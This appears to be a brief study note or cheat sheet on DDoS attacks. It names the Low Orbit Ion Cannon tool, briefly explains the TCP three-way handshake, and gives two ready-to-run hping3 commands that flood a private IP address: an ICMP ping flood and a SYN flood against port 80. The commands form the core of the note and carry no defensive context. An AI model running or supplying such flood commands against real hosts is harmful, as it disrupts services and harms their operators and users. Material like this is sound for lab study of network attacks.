DDos Attackâ€‹

1) Low Orbit Ion Cannon
2) Ping ICMP flood
    - sudo hping3 -1 --flood 10.7.1.50
3) SYN Flood Attack
    - Any TCP Connection has 3 way handshake
          i) SYN - CLIENT
         ii) SYN ACK - SERVER
        iii) ACK - CLIENT
    - sudo hping3 -d 200 -p 80 -S --flood 10.7.1.50
